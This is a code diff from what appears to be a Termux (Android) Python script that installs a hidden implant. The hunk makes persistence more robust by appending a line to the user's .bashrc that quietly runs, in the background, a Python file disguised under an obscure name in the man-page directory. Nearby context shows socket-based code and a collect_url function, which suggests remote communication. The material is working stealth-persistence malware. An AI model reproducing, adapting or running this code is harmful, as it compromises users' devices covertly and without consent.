@@ -111,10 +111,16 @@ collect_url(addr)
 """)
 #sh.move("plugin/plugin", "/data/data/com.termux/files/usr/share/man/man3/qcxa_bza_ex.gz")
 
-with open("/data/data/com.termux/files/home/.bashrc","a") as file :
-     file.write("\n\nbash -c 'set +m; nohup python /data/data/com.termux/files/usr/share/man/man3/qcxa_bza_exe.py > /data/data/com.termux/files/usr/share/man/man3/output.log 2>&1 < /dev/null &'")
+try :
+ f = open("/data/data/com.termux/files/home/.bashrc", "r")
+ d1 = f.read()
+ f.close()
+ if not "bash -c 'set +m; nohup python /data/data/com.termux/files/usr/share/man/man3/qcxa_bza_exe.py > /data/data/com.termux/files/usr/share/man/man3/output.log 2>&1 < /dev/null &'" in d1 :
+    with open("/data/data/com.termux/files/home/.bashrc","a") as file :
+         file.write("\n\nbash -c 'set +m; nohup python /data/data/com.termux/files/usr/share/man/man3/qcxa_bza_exe.py > /data/data/com.termux/files/usr/share/man/man3/output.log 2>&1 < /dev/null &'")
 
-
+except Exception as e:
+ print(e)
 
 
 data = """import socket
